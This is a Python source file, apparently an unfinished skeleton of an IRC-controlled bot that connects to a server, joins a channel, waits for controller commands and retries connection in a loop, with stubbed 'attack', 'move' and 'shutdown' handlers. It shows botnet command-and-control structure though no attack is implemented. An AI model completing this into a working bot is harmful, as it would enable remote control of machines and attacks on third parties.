import time
import socket
import sys

ERROR_FLAG = -1

#connection info
irc = ""
channel = "#"

#bot info
nick = "V"
atk_cnt = 0


def cmd_attack():
	pass
	
def cmd_status():
	pass
	
def cmd_move():
	pass
	
def cmd_quit():
	pass
	
def cmd_shutdown():
	pass

#receive a command from the controller
def rcv_command():
	#try:
	cmd = irc.recv(1024)
	#except 	

#send as bytes
def send(msg):
	irc.send(msg.encode('UTF-8'))
	
#return a status message to the controller
def return_status(msg):
	send("PRIVMSG " + channel + " " + msg + "n")

#handle the connection to the IRC server
def handle_connection():
	#TO DO Verify controller
	
	#wait for commands
	cmd = rcv_command()
	


	return ERROR_FLAG

#connect to the specified IRC server and channel
def connect(host, port):
	global nick, irc
	nick_taken = True
	irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		irc.connect((host,port))
		print("connection made")
	except ConnectionRefusedError:
		print("could not make connection")
	while (nick_taken == True):
		send("USER " + nick + " " + nick + " " + nick + ": This bot is connectingn")
		send("NICK " + nick + "n")
		send("JOIN " + channel + "n")
		
		#TO DO check if nick is taken
		nick_taken = False
	

#main
def main():
	global channel, secret_phrase
	
	hostname = ""
	port = 0
	channel = ""
	secret_phrase = ""
	
	#ensure correct number of commands
	if len(sys.argv) != 5:
		print("incorrect number of command line arguments. Command is...")
		print("\tbot.py <hostname> <port> <channel> <secret-phrase>")
		return
		
	#ensure port is a number
	if not sys.argv[2].isdigit():
		print("Command argument 2 could not be processed. Command is...")
		print("\tbot.py <hostname> <port> <channel> <secret-phrase>")
		return
		
	#extract arguments from command line
	hostname = sys.argv[1]
	port = int(sys.argv[2])
	channel = sys.argv[3]
	secret_phrase = sys.argv[4]
	
	while True:
		#connect to the IRC server
		connect(hostname, port)
		#handle the connection
		result = handle_connection()
		#if handle connection ends with error
		if result == ERROR_FLAG:
			#wait 5 seconds before retrying connection
			time.sleep(5)
			
		#else handle connection ended with shutdown command
		else:
			#report back to controller about successful shutdown
			break
		
			
		

main()
